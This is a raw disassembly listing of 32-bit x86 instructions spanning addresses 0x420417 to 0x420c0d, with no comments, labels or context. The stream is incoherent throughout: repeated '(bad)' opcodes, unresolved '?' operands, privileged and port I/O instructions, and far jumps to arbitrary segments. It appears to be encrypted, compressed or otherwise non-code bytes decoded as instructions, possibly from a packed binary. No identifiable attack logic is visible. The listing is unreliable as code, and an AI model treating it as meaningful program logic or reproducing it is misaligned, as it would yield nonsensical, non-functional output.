  420417:	sar    dl,0xf8
  42041a:	mov    edx,DWORD PTR [ecx+0x5d82d7ad]
  420420:	leave  
  420421:	xor    ebp,ebp
  420423:	inc    ebp
  420424:	xchg   esi,eax
  420425:	push   ss
  420426:	cld    
  420427:	push   0xffffffd1
  420429:	mov    ebp,0xc5f87cbd
  42042e:	mov    ebp,0xdec58da3
  420433:	xlat   BYTE PTR ds:[ebx]
  420434:	mov    ah,0xb8
  420436:	or     BYTE PTR [ebp+0x3b49e69e],ch
  42043c:	dec    eax
  42043d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42043e:	add    al,0x45
  420440:	aad    0xc8
  420442:	cmc    
  420443:	adc    ebp,ebp
  420445:	cmp    esp,DWORD PTR [ebp+0x6629dc35]
  42044b:	data16 outs dx,BYTE PTR ds:[esi]
  42044d:	sub    eax,DWORD PTR ds:0xb1d0781d
  420453:	dec    ebx
  420454:	pop    ss
  420455:	mov    ds:0xdd9d21a2,al
  42045a:	das    
  42045b:	pop    ebx
  42045c:	test   DWORD PTR [esi+0x55],0x6847136c
  420463:	dec    edi
  420464:	dec    edx
  420465:	int    0xed
  420467:	(bad)  
  420469:	pop    edx
  42046a:	jns    0x42040d
  42046c:	leave  
  42046d:	test   DWORD PTR [eax*1+0x2425a72f],esi
  420474:	xchg   ebp,eax
  420475:	mov    ebp,DWORD PTR [ebx-0x1c]
  420478:	mov    ebp,0x90740377
  42047d:	xchg   ebx,eax
  42047e:	imul   BYTE PTR [edx+0x750e94eb]
  420484:	sar    BYTE PTR [edi-0x38],1
  420487:	aas    
  420488:	in     eax,dx
  420489:	push   edx
  42048a:	ja     0x4204ab
  42048c:	mov    WORD PTR [ecx],fs
  42048e:	cs pop edi
  420490:	push   0x1b
  420492:	mov    al,0x4a
  420494:	pushf  
  420495:	ss retf 0x6b50
  420499:	out    dx,al
  42049a:	cld    
  42049b:	adc    edx,DWORD PTR [eax+0x4c]
  42049e:	scas   al,BYTE PTR es:[edi]
  42049f:	out    dx,al
  4204a0:	jb     0x420428
  4204a2:	mov    eax,ds:0xc509daa1
  4204a7:	sub    BYTE PTR [edi+ebx*4],0x3f
  4204ab:	cmp    eax,0x214f2e42
  4204b0:	push   ss
  4204b1:	(bad)  
  4204b2:	leave  
  4204b3:	lods   eax,DWORD PTR ds:[esi]
  4204b4:	or     BYTE PTR [ecx+edx*8+0x21],ch
  4204b8:	mov    eax,0xea13df89
  4204bd:	vsqrtsd xmm0,xmm2,xmm6
  4204c1:	mov    al,ds:0x808aec5e
  4204c6:	cdq    
  4204c7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204c9:	sub    al,BYTE PTR [ebp+0x36]
  4204cc:	test   eax,0x1cb70e7b
  4204d1:	test   eax,0x83904fa5
  4204d6:	pushf  
  4204d7:	and    edi,edx
  4204d9:	inc    esp
  4204da:	pop    ebp
  4204db:	push   cs
  4204dc:	or     BYTE PTR [esi],al
  4204de:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204df:	jg     0x420475
  4204e1:	inc    edx
  4204e2:	lods   eax,DWORD PTR ds:[esi]
  4204e3:	rcl    DWORD PTR [ebp+0x4778ab46],cl
  4204e9:	mov    eax,DWORD PTR ds:[ecx+0x7b]
  4204ed:	mov    edi,0xd2599e3a
  4204f2:	je     0x42052d
  4204f4:	xchg   ebx,eax
  4204f5:	xchg   ecx,eax
  4204f6:	or     eax,0x184e8064
  4204fb:	push   es
  4204fc:	(bad)  
  4204fd:	adc    DWORD PTR [ebp-0x577e2416],esi
  420503:	lahf   
  420504:	das    
  420505:	fst    DWORD PTR [ebx+0x6d]
  420508:	icebp  
  420509:	in     eax,dx
  42050a:	je     0x42055f
  42050c:	add    DWORD PTR [ebx],esp
  42050e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42050f:	mov    eax,0x825b2496
  420514:	call   0x88fa:0xacf568ee
  42051b:	loop   0x4204e4
  42051d:	cmp    ch,0x2c
  420520:	jg     0x420500
  420522:	fdivr  DWORD PTR [edx+0x7db340b0]
  420528:	or     eax,0x1d4c5ea3
  42052d:	sar    BYTE PTR [ebx],cl
  42052f:	sahf   
  420530:	mov    fs:0xb6c74672,al
  420536:	sbb    eax,0xa6d6c3
  42053b:	or     esi,DWORD PTR [esi-0x67d6f68f]
  420541:	fmul   QWORD PTR [eax]
  420543:	fsub   st,st(6)
  420545:	mov    esi,0xdf7851c5
  42054a:	cwde   
  42054b:	mov    ds:0xb922b1c9,eax
  420550:	jmp    0xf2fe:0x77df3c52
  420557:	pop    ebp
  420558:	push   edi
  420559:	xlat   BYTE PTR ds:[ebx]
  42055a:	push   edi
  42055b:	push   0x4405e9a6
  420560:	add    cl,bh
  420562:	mov    ch,0xf1
  420564:	add    eax,0xe7ce60a9
  420569:	aam    0x74
  42056b:	add    DWORD PTR [ebx-0x6c6c01dc],edx
  420571:	push   ss
  420572:	push   eax
  420573:	cmp    al,0xa9
  420575:	jg     0x42052f
  420577:	or     DWORD PTR [ecx],0xb4229a61
  42057d:	and    ebx,DWORD PTR [edx+0x735d7290]
  420583:	mov    edx,0x3c69b9dc
  420588:	mov    ds:0x15280630,eax
  42058d:	leave  
  42058e:	(bad)  
  42058f:	mov    bh,0xd
  420591:	aam    0x2
  420593:	mov    ah,0x60
  420595:	loop   0x420537
  420597:	pop    esi
  420598:	push   es
  420599:	hlt    
  42059a:	mov    ecx,0xd026dc4e
  42059f:	adc    al,dl
  4205a1:	test   BYTE PTR [ecx+eax*2+0x6cda3d84],0xa
  4205a9:	add    ebx,edx
  4205ab:	loopne 0x42058a
  4205ad:	add    dh,BYTE PTR [ebx-0x6e]
  4205b0:	js     0x4205c8
  4205b2:	mov    ds:0x3d8b934,al
  4205b7:	mov    ebx,esi
  4205b9:	mov    ch,0x96
  4205bb:	pop    edx
  4205bc:	and    eax,0xe2906e01
  4205c1:	inc    esi
  4205c2:	or     cl,BYTE PTR [ebx]
  4205c4:	pop    es
  4205c5:	aaa    
  4205c6:	aam    0xf3
  4205c8:	pop    ecx
  4205c9:	add    bl,ch
  4205cb:	dec    esp
  4205cc:	rol    DWORD PTR [ebp-0x357e5cfa],cl
  4205d2:	jno    0x4205d5
  4205d4:	mov    al,ds:0xc6eaecf2
  4205d9:	pop    es
  4205da:	outs   dx,DWORD PTR ds:[esi]
  4205db:	inc    ebp
  4205dc:	mov    BYTE PTR [ebx],al
  4205de:	xchg   ebx,eax
  4205df:	mov    DWORD PTR [ebx-0x34],esp
  4205e2:	and    eax,0x113abe0b
  4205e7:	mov    al,0x8f
  4205e9:	push   esp
  4205ea:	add    eax,0x8a0b1e74
  4205ef:	and    eax,0x39465e5
  4205f4:	data16 sbb al,ch
  4205f7:	inc    ecx
  4205f8:	ret    0x345e
  4205fb:	add    BYTE PTR [ebx+0x38e84414],cl
  420601:	popf   
  420602:	leave  
  420603:	and    eax,0xabf53151
  420608:	and    eax,0x4ad16cd7
  42060d:	fs clc 
  42060f:	loope  0x420653
  420611:	in     eax,0x51
  420613:	cmp    esi,DWORD PTR [ecx+0x6a]
  420616:	add    dl,cl
  420618:	(bad)  
  42061a:	jae    0x420675
  42061c:	ret    
  42061d:	arpl   WORD PTR [ecx+ecx*1],di
  420620:	xchg   ebp,eax
  420621:	pop    ds
  420622:	jecxz  0x42068f
  420624:	test   BYTE PTR [ebp+0x57854b4c],ah
  42062a:	push   cs
  42062b:	and    BYTE PTR [eax+0x78f70051],dl
  420631:	ins    BYTE PTR es:[edi],dx
  420632:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420633:	sub    edx,ebp
  420635:	push   ebp
  420636:	pop    ss
  420637:	mov    eax,ds:0x17ffacbb
  42063c:	cmp    eax,0x225c2d2f
  420641:	call   0xfea167d1
  420646:	pop    ebp
  420647:	mov    dh,0xd9
  420649:	adc    ch,dl
  42064b:	ret    0xd5c8
  42064e:	cmp    dl,BYTE PTR [edi-0x4d82fdb1]
  420654:	mov    ecx,?
  420656:	ins    DWORD PTR es:[edi],dx
  420657:	fdivr  st(0),st
  420659:	sub    ebp,DWORD PTR [edi+0x7]
  42065c:	xor    BYTE PTR [edx],bl
  42065e:	(bad)  
  42065f:	sbb    DWORD PTR [ecx],0x73456984
  420665:	sbb    eax,0xc0295f85
  42066a:	mov    ebx,0xb8491a5a
  42066f:	test   al,0x13
  420671:	inc    esi
  420672:	pop    esi
  420673:	cmp    eax,0xcc20e010
  420678:	dec    DWORD PTR [ecx-0x59569e21]
  42067e:	adc    al,BYTE PTR [ecx+eax*2+0x49b8b041]
  420685:	cmc    
  420686:	or     al,0x51
  420688:	lahf   
  420689:	dec    ebp
  42068a:	and    BYTE PTR [eax+0x57],bl
  42068d:	jnp    0x4206a5
  42068f:	push   ebx
  420690:	(bad)  
  420691:	aad    0x2c
  420693:	and    eax,ebx
  420695:	std    
  420696:	push   ebp
  420697:	jb     0x420663
  420699:	inc    esp
  42069a:	out    dx,al
  42069b:	jge    0x4206cc
  42069d:	in     al,dx
  42069e:	(bad)  
  42069f:	xchg   ebx,eax
  4206a0:	out    dx,eax
  4206a1:	pop    ds
  4206a2:	sub    DWORD PTR [eax+0x283aae8],ecx
  4206a8:	xor    eax,0xffcc3951
  4206ad:	mov    cl,al
  4206af:	outs   dx,DWORD PTR ds:[esi]
  4206b0:	cmp    ecx,DWORD PTR [ebx+0x5f]
  4206b3:	scas   al,BYTE PTR es:[edi]
  4206b4:	push   0x73
  4206b6:	out    0x89,eax
  4206b8:	cmp    al,0x1c
  4206ba:	das    
  4206bb:	dec    eax
  4206bc:	fadd   st(7),st
  4206be:	mov    dh,0xdd
  4206c0:	outs   dx,DWORD PTR ds:[esi]
  4206c1:	inc    ebp
  4206c2:	pop    edx
  4206c3:	scas   eax,DWORD PTR es:[edi]
  4206c4:	jmp    0x48a9eca8
  4206c9:	test   eax,0xf578b7dc
  4206ce:	xor    eax,0xb0fbb4dd
  4206d3:	jp     0x420662
  4206d5:	pusha  
  4206d6:	lods   eax,DWORD PTR ds:[esi]
  4206d7:	les    ebp,FWORD PTR [ebx+eiz*2]
  4206da:	xchg   edx,eax
  4206db:	mov    ?,edi
  4206dd:	mov    cl,0x16
  4206df:	pop    ss
  4206e0:	lock fdivr DWORD PTR [ecx]
  4206e3:	jno    0x420739
  4206e5:	cli    
  4206e6:	stc    
  4206e7:	adc    BYTE PTR [ebp+0x6c],dh
  4206ea:	arpl   WORD PTR [eax+0x7d662dd6],cx
  4206f0:	imul   ebx,DWORD PTR [edi],0xffffff94
  4206f3:	(bad)  
  4206f4:	jmp    0x5dd513d
  4206f9:	(bad)  
  4206fa:	push   ebx
  4206fb:	jns    0x420777
  4206fd:	jo     0x4206d0
  4206ff:	enter  0xb4e8,0x43
  420703:	xor    ecx,DWORD PTR [edi-0x48]
  420706:	xor    esi,edx
  420708:	mov    bl,0xf6
  42070a:	xor    ch,cl
  42070c:	das    
  42070d:	xlat   BYTE PTR ds:[ebx]
  42070e:	push   ds
  42070f:	add    BYTE PTR [eax-0x36223b54],bl
  420715:	push   ds
  420716:	test   eax,0xe1e489ab
  42071b:	(bad)  
  42071c:	icebp  
  42071d:	ins    DWORD PTR es:[edi],dx
  42071e:	or     eax,0x52b0849c
  420723:	repz popf 
  420725:	push   es
  420726:	ret    0x5cb6
  420729:	add    dl,cl
  42072b:	sbb    eax,0xe7eb80f5
  420730:	and    ch,BYTE PTR [eax+0x83a9552]
  420736:	ins    DWORD PTR es:[edi],dx
  420737:	out    0x18,al
  420739:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42073b:	gs call 0x541cb760
  420741:	jge    0x4206e0
  420743:	pop    ecx
  420744:	nop
  420745:	mov    dh,0x18
  420747:	icebp  
  420748:	mov    ds:0x8dae8f4,eax
  42074d:	mov    bl,0xc5
  42074f:	mov    dl,0x32
  420751:	dec    esp
  420752:	and    DWORD PTR [edx-0x52],eax
  420755:	jmp    edi
  420757:	xchg   BYTE PTR [esi+0x3fc06ed7],ah
  42075d:	aaa    
  42075e:	jne    0x42071a
  420760:	adc    DWORD PTR [ecx+0x41],esp
  420763:	mov    esi,0xed134031
  420768:	push   ss
  420769:	aad    0x62
  42076b:	dec    eax
  42076c:	fld    TBYTE PTR gs:[edx]
  42076f:	imul   ecx,edx,0xa4ba2ba3
  420775:	out    dx,al
  420776:	call   0x4176d93f
  42077b:	je     0x420718
  42077d:	pop    ebp
  42077e:	mov    WORD PTR [esi+0x21],ds
  420781:	sti    
  420782:	mov    al,0x3a
  420784:	je     0x4207a4
  420786:	mov    ecx,0x15053ac3
  42078b:	mov    al,0x26
  42078d:	mov    ebx,0x7a62c7dd
  420792:	pop    esi
  420793:	add    DWORD PTR [ebx+0x7c423b06],eax
  420799:	sti    
  42079a:	shl    edi,0x39
  42079d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42079e:	dec    eax
  42079f:	scas   eax,DWORD PTR es:[edi]
  4207a0:	sti    
  4207a1:	ja     0x4207ad
  4207a3:	xchg   esp,eax
  4207a4:	sub    BYTE PTR [ecx+eax*8],bh
  4207a7:	xchg   BYTE PTR [edx-0x69],bl
  4207aa:	mov    cl,0x69
  4207ac:	ret    0x9f7e
  4207af:	jg     0x4207b9
  4207b1:	ror    DWORD PTR [ebp-0x59],0x1d
  4207b5:	sbb    eax,0xd72882f9
  4207ba:	daa    
  4207bb:	dec    esi
  4207bc:	imul   edx,DWORD PTR [edi+0xd6effcc],0x547d7081
  4207c6:	pop    ecx
  4207c7:	in     al,dx
  4207c8:	addr16 dec ebx
  4207ca:	push   ss
  4207cb:	xor    eax,0xb47ad917
  4207d0:	dec    esp
  4207d1:	cmp    eax,0x7d90aa45
  4207d6:	or     DWORD PTR [edx+0x6b],esi
  4207d9:	mov    WORD PTR [eax-0x129ec508],es
  4207df:	rol    DWORD PTR [ebx+0x5493fc4c],1
  4207e5:	in     eax,dx
  4207e6:	push   ss
  4207e7:	data16 fdivr st,st(4)
  4207ea:	inc    edx
  4207eb:	pop    eax
  4207ec:	mov    al,ds:0x669f74f4
  4207f1:	xor    al,cl
  4207f3:	dec    ecx
  4207f4:	dec    ecx
  4207f5:	xchg   esp,eax
  4207f6:	cmp    BYTE PTR [ebp+0x56],dh
  4207f9:	test   al,0x75
  4207fb:	addr16 je 0x420792
  4207fe:	fstp   DWORD PTR [esi-0x67ca7d87]
  420804:	in     eax,dx
  420805:	shr    BYTE PTR [esi+0x47],cl
  420808:	lea    edx,[ebp+0x7ec4daf9]
  42080e:	call   0x5eb3:0x921bb4b1
  420815:	cmc    
  420816:	mov    edx,0x479de56d
  42081b:	xor    DWORD PTR [ecx+0x47],ebx
  42081e:	sahf   
  42081f:	cmc    
  420820:	ss aad 0x8f
  420823:	jmp    0x460c1cb2
  420828:	jle    0x4207d3
  42082a:	popf   
  42082b:	cmp    DWORD PTR [esi+0x37],0xffffffc8
  42082f:	and    ebp,DWORD PTR [ecx-0x1cb12fd5]
  420835:	test   BYTE PTR [esi],0x1c
  420838:	retf   
  420839:	jle    0x4207ce
  42083b:	out    0x16,eax
  42083d:	adc    BYTE PTR [ebp-0x401e2de7],dl
  420843:	and    edx,DWORD PTR [ecx+0x6f0d38e6]
  420849:	add    DWORD PTR [eax+0x3],0xffffff98
  42084d:	icebp  
  42084e:	jecxz  0x420899
  420850:	fchs   
  420852:	retf   0xb49a
  420855:	dec    ebp
  420856:	rcl    DWORD PTR ds:0xb3c66107,cl
  42085c:	std    
  42085d:	mov    cl,BYTE PTR [ebp+0x25]
  420860:	pusha  
  420861:	retf   
  420862:	cmp    eax,0xef7fb10d
  420867:	rol    BYTE PTR ds:0xbff84449,cl
  42086d:	mov    al,ds:0x834a2c68
  420872:	add    ebp,DWORD PTR [ebx+0x537b1e1c]
  420878:	test   eax,0xbd866330
  42087d:	or     eax,0xd8a8eee8
  420882:	sub    cl,0x6d
  420885:	div    DWORD PTR [ebx-0x69ec3ba]
  42088b:	pop    esp
  42088c:	push   cs
  42088d:	fisub  DWORD PTR [eax]
  42088f:	dec    ecx
  420890:	mov    eax,ds:0x1c60b7c2
  420895:	push   ecx
  420896:	xchg   ebp,eax
  420897:	inc    esi
  420898:	cmp    ebx,edi
  42089a:	outs   dx,BYTE PTR ds:[esi]
  42089b:	pop    esp
  42089c:	jmp    0x457c8cfe
  4208a1:	ret    0x713e
  4208a4:	mov    es,WORD PTR [ebp-0x7c730598]
  4208aa:	test   BYTE PTR [ebx],ah
  4208ac:	into   
  4208ad:	test   al,0xea
  4208af:	add    BYTE PTR [edx+0x5532e1b7],cl
  4208b5:	cmp    ebx,DWORD PTR [esi]
  4208b7:	mov    BYTE PTR [edi],ah
  4208b9:	cdq    
  4208ba:	fucomip st,st(7)
  4208bc:	mul    BYTE PTR [eax+0x145241e5]
  4208c2:	inc    esp
  4208c3:	ds mov eax,0x6a5bfdb2
  4208c9:	or     al,0x14
  4208cb:	(bad)  
  4208cc:	xchg   esp,eax
  4208cd:	xchg   ecx,eax
  4208ce:	add    BYTE PTR [eax+0x4],ah
  4208d1:	outs   dx,BYTE PTR ds:[esi]
  4208d2:	in     eax,0xc2
  4208d4:	and    esp,esi
  4208d6:	sub    bl,cl
  4208d8:	jmp    DWORD PTR [esi+0x27]
  4208db:	imul   ax,WORD PTR [edx+edx*4-0x67ea8365],0xd6db
  4208e5:	xchg   edx,eax
  4208e6:	dec    esp
  4208e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4208e8:	call   0x7733:0xb93a83cc
  4208ef:	imul   esi,esp,0xffffffd8
  4208f2:	ins    DWORD PTR es:[edi],dx
  4208f3:	jmp    0x34b1:0x325040fa
  4208fa:	icebp  
  4208fb:	mov    DWORD PTR [ecx],eax
  4208fd:	pop    ds
  4208fe:	stos   BYTE PTR es:[edi],al
  4208ff:	lahf   
  420900:	inc    ebp
  420901:	aas    
  420902:	push   ecx
  420903:	lods   ax,WORD PTR ds:[esi]
  420905:	sub    esp,DWORD PTR [edx+0x66539e5a]
  42090b:	mov    ecx,0x50fce377
  420910:	sub    BYTE PTR [ebx],dl
  420912:	out    dx,al
  420913:	in     al,0x75
  420915:	psubb  mm2,QWORD PTR [ebx]
  420918:	xchg   ebp,eax
  420919:	push   eax
  42091a:	push   ebx
  42091b:	xor    eax,0x7075e3b9
  420920:	das    
  420921:	dec    ecx
  420922:	out    0x8e,al
  420924:	pop    ds
  420925:	mov    bh,BYTE PTR [ebp+ecx*4-0x13]
  420929:	xchg   edx,eax
  42092a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42092b:	aas    
  42092c:	dec    edi
  42092d:	push   es
  42092e:	pop    esp
  42092f:	jne    0x420907
  420931:	retf   0x6961
  420934:	pop    eax
  420935:	bound  ebx,QWORD PTR [ebx]
  420937:	outs   dx,DWORD PTR ds:[esi]
  420938:	mov    al,0xaa
  42093a:	pop    ds
  42093b:	das    
  42093c:	pop    ebx
  42093d:	out    0x23,al
  42093f:	mov    dl,0xd
  420941:	data16 jno 0x42094c
  420944:	mov    ecx,edi
  420946:	push   ds
  420947:	rcl    BYTE PTR [eax+0x20],1
  42094a:	imul   ebx,DWORD PTR [eax+eax*8+0x79],0xffffffe2
  42094f:	shr    DWORD PTR [edi],0x1b
  420952:	and    DWORD PTR [edi-0xea0ac03],ebx
  420958:	jge    0x420941
  42095a:	or     ebp,edx
  42095c:	sub    dl,BYTE PTR [esi-0x27b6298a]
  420962:	fs sbb al,0xbb
  420965:	test   eax,edx
  420967:	fadd   st,st(6)
  420969:	xorps  xmm2,xmm7
  42096c:	xchg   edx,eax
  42096d:	sub    ebp,eax
  42096f:	xchg   edi,ecx
  420971:	or     ebp,DWORD PTR [bx-0x6f3a]
  420976:	jl     0x420991
  420978:	sbb    esi,DWORD PTR ds:0x70632ec4
  42097e:	les    ecx,FWORD PTR [ebx+0x2c]
  420981:	dec    eax
  420982:	stc    
  420983:	clc    
  420984:	int    0x7f
  420986:	pop    ebx
  420987:	data16 sbb al,0xa7
  42098a:	jecxz  0x4209f5
  42098c:	push   es
  42098d:	cs mov ah,cl
  420990:	or     BYTE PTR [edi+0x26],cl
  420993:	iret   
  420994:	mov    dl,0xca
  420996:	inc    ebp
  420997:	jmp    0x93f783cb
  42099c:	jmp    0x4209a4
  42099e:	sbb    BYTE PTR [ebx+0x63],al
  4209a1:	std    
  4209a2:	call   0x9b11:0x87e7d2df
  4209a9:	call   0x8c399ad5
  4209ae:	arpl   WORD PTR [edx+ecx*8-0xc9228b8],si
  4209b5:	push   esi
  4209b6:	pause  
  4209b8:	sbb    edx,esp
  4209ba:	retf   0x4dab
  4209bd:	mov    gs,ecx
  4209bf:	outs   dx,BYTE PTR ds:[esi]
  4209c0:	popf   
  4209c1:	jbe    0x4209a7
  4209c3:	push   eax
  4209c4:	dec    ebp
  4209c5:	loope  0x420a1f
  4209c7:	pop    ebx
  4209c8:	mov    al,ds:0x17715124
  4209cd:	cmc    
  4209ce:	lods   al,BYTE PTR ds:[esi]
  4209cf:	pop    esi
  4209d0:	sub    al,0x56
  4209d2:	dec    esp
  4209d3:	es out dx,eax
  4209d5:	shr    DWORD PTR [edx],cl
  4209d7:	imul   eax,ebp,0x9b4d9af
  4209dd:	enter  0x7bfe,0xe1
  4209e1:	add    BYTE PTR [esi+edi*4-0x14],al
  4209e5:	lock push cs
  4209e7:	dec    edx
  4209e8:	push   eax
  4209e9:	fisub  WORD PTR [eax+0x59]
  4209ec:	rcr    BYTE PTR [ebx],0x7a
  4209ef:	imul   ecx,DWORD PTR [ebx+0x41],0x130b72fd
  4209f6:	jae    0x4209e5
  4209f8:	xor    bl,dh
  4209fa:	ja     0x4209c4
  4209fc:	dec    edi
  4209fd:	pusha  
  4209fe:	idiv   DWORD PTR [ebx-0x10]
  420a01:	imul   esi,DWORD PTR [esp+eiz*2-0x521d6b66],0x253f762b
  420a0c:	add    al,0x7
  420a0e:	or     ch,al
  420a10:	outs   dx,BYTE PTR ds:[esi]
  420a11:	retf   
  420a12:	or     BYTE PTR [edi+0x2e4388bd],bh
  420a18:	fld    QWORD PTR fs:[esi+0x0]
  420a1c:	dec    ecx
  420a1d:	jnp    0x4209a2
  420a1f:	xor    bh,dh
  420a21:	fadd   QWORD PTR [ecx-0x596391ae]
  420a27:	in     eax,dx
  420a28:	sub    ecx,DWORD PTR [ebx+0x3b]
  420a2b:	and    eax,0x79bf7ccc
  420a30:	or     ch,ch
  420a32:	sbb    eax,0xec48931d
  420a37:	inc    ebp
  420a38:	sbb    BYTE PTR [eax-0x68],ah
  420a3b:	mov    ebp,0x4e62245f
  420a40:	or     DWORD PTR [edi-0x8],0x3fea1f8f
  420a47:	das    
  420a48:	inc    esi
  420a49:	fidiv  WORD PTR [edi-0x25]
  420a4c:	dec    esi
  420a4d:	je     0x420a68
  420a4f:	lock (bad) [ebx-0x3c]
  420a53:	push   edi
  420a55:	push   0x8f14f2b7
  420a5a:	loop   0x420a6c
  420a5c:	push   cs
  420a5d:	fadd   DWORD PTR [ecx]
  420a5f:	aas    
  420a60:	nop
  420a61:	mov    ds:0x7401bff0,eax
  420a66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a67:	push   esp
  420a68:	and    al,0x13
  420a6a:	adc    eax,0x960cfd7f
  420a6f:	loope  0x420a5e
  420a71:	shr    ch,0x8c
  420a74:	hlt    
  420a75:	mov    dh,0xda
  420a77:	imul   ecx,DWORD PTR [esi+0x6ccfbd33],0x48
  420a7e:	test   BYTE PTR [ecx-0x59],bl
  420a81:	retf   0x5018
  420a84:	adc    cl,BYTE PTR [eax-0x26]
  420a87:	stos   BYTE PTR es:[edi],al
  420a88:	test   DWORD PTR [eax+0x2d66f2ab],eax
  420a8e:	jmp    0x420afb
  420a90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a91:	idiv   al
  420a93:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420a94:	sub    ah,ah
  420a96:	sahf   
  420a97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a98:	push   ebx
  420a99:	fs jb  0x420a60
  420a9c:	mov    ?,WORD PTR [eax]
  420a9e:	icebp  
  420a9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420aa0:	fbstp  TBYTE PTR [ebx-0x2f]
  420aa3:	pop    esi
  420aa4:	fdivr  st,st(6)
  420aa6:	es pop ds
  420aa8:	adc    ah,BYTE PTR [edx-0x29]
  420aab:	cmp    cl,BYTE PTR [edx+eiz*2+0x1e]
  420aaf:	out    0x85,eax
  420ab1:	jb     0x420a9f
  420ab3:	inc    ebp
  420ab4:	pop    edx
  420ab5:	cmp    bh,cl
  420ab7:	or     BYTE PTR [edx-0x8],0x7f
  420abb:	je     0x420a67
  420abd:	push   ebp
  420abe:	mov    eax,0xe488102c
  420ac3:	add    al,0x89
  420ac5:	lds    esi,FWORD PTR [edx+0x2878511b]
  420acb:	shr    DWORD PTR [ebx+0x3c],0x6a
  420acf:	pop    eax
  420ad0:	mov    dh,BYTE PTR [esi+0x5f]
  420ad3:	mov    al,ds:0xb0721d5f
  420ad8:	inc    ebx
  420ad9:	and    eax,0xfdff66ea
  420ade:	add    ebp,ebp
  420ae0:	mov    ebx,0xb77b80f6
  420ae5:	loopne 0x420b48
  420ae7:	(bad)  
  420ae9:	or     ch,dh
  420aeb:	or     eax,0x3e04ed5a
  420af0:	js     0x420ad1
  420af2:	mov    WORD PTR [edi+0x25],?
  420af5:	fdivr  DWORD PTR [ecx]
  420af7:	gs push esi
  420af9:	sar    eax,cl
  420afb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420afc:	jo     0x420abd
  420afe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420aff:	cmp    eax,esp
  420b01:	mov    ecx,0xdba00322
  420b06:	loope  0x420abb
  420b08:	aaa    
  420b09:	jp     0x420b19
  420b0b:	dec    esi
  420b0c:	and    bh,BYTE PTR [esi]
  420b0e:	mov    WORD PTR [edx-0x9],?
  420b11:	fisttp DWORD PTR [ebp+0x1e]
  420b14:	fmul   st(3),st
  420b16:	sub    cl,BYTE PTR [esi-0x6]
  420b19:	xchg   esi,eax
  420b1a:	mov    dh,0xe1
  420b1c:	loopne 0x420b88
  420b1e:	cmp    al,0xc7
  420b20:	jmp    0x420b72
  420b22:	repz jno 0x420b29
  420b25:	sbb    al,0xa8
  420b27:	push   cs
  420b28:	out    0xe9,al
  420b2a:	fchs   
  420b2c:	aas    
  420b2d:	cmp    BYTE PTR ds:0x47f6c763,bl
  420b33:	mov    ebp,0x6b5ad2e1
  420b38:	inc    esp
  420b39:	arpl   WORD PTR [ebp-0x48a51614],sp
  420b3f:	mov    gs,WORD PTR [esp+eax*4-0x6e]
  420b43:	jmp    0xcae:0x5c6b
  420b49:	jbe    0x420b2c
  420b4b:	mul    BYTE PTR [esp+esi*8+0x39]
  420b4f:	add    ebp,edi
  420b51:	fpatan 
  420b53:	ins    DWORD PTR es:[edi],dx
  420b54:	mov    bh,0xad
  420b56:	in     eax,0x4d
  420b58:	sbb    esp,ebx
  420b5a:	arpl   WORD PTR [edi+ecx*1],si
  420b5d:	mov    ecx,0x54e3aebb
  420b62:	mov    ebp,0xcc56b324
  420b67:	mov    ebx,0xe7074f7c
  420b6c:	or     BYTE PTR [ecx],0x3c
  420b6f:	pop    ecx
  420b70:	jle    0x420bc8
  420b72:	xor    al,0x8f
  420b74:	fsub   QWORD PTR [eax+0x3b]
  420b77:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b78:	cmp    DWORD PTR [edx-0xe],0x23e83354
  420b7f:	stos   BYTE PTR es:[edi],al
  420b80:	pop    es
  420b81:	loopne 0x420b03
  420b83:	aas    
  420b84:	int    0xf0
  420b86:	mov    esp,0xec207515
  420b8b:	jbe    0x420b18
  420b8d:	fstp   TBYTE PTR [ebx]
  420b8f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420b90:	ficomp WORD PTR [edx-0x6b70a03]
  420b96:	dec    eax
  420b97:	out    0xe3,al
  420b99:	es mov dh,0x55
  420b9c:	ret    
  420b9d:	call   FWORD PTR [ebx+0x4584a260]
  420ba3:	cmp    ebx,DWORD PTR [ebp+0x18a44c97]
  420ba9:	or     edx,DWORD PTR [ebx-0x9b68d44]
  420baf:	mov    cl,0x3c
  420bb1:	mov    eax,0x2c53005d
  420bb6:	mov    cl,bh
  420bb8:	call   0xf0e9:0x154b984a
  420bbf:	stos   DWORD PTR es:[edi],eax
  420bc0:	div    BYTE PTR [edx-0x7a2fbe3c]
  420bc6:	inc    eax
  420bc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420bc8:	or     eax,0x2fd12702
  420bcd:	iret   
  420bce:	lds    edi,FWORD PTR [ebx]
  420bd0:	or     DWORD PTR [eax],ebp
  420bd2:	por    mm2,QWORD PTR fs:0x84fd5ccf
  420bda:	mov    ds:0x936407a8,al
  420bdf:	jmp    0x420c0c
  420be1:	test   al,0xc4
  420be3:	stc    
  420be4:	mov    dh,0xdc
  420be6:	(bad)  
  420be8:	mov    ds:0x3479d7a9,eax
  420bed:	sbb    al,0xe7
  420bef:	outs   dx,BYTE PTR ds:[esi]
  420bf0:	push   esi
  420bf1:	mov    ch,0xe5
  420bf3:	in     eax,0x90
  420bf5:	(bad)  
  420bf6:	or     al,0x11
  420bf8:	sub    BYTE PTR [ebp+0x5631b30c],bl
  420bfe:	push   ebp
  420bff:	jge    0x420bb5
  420c01:	mov    ecx,0x79724cfc
  420c06:	arpl   WORD PTR [edi-0x69],si
  420c09:	lock adc ebx,DWORD PTR [esi+0x7d]
  420c0d:	sbb    eax,0xe777491
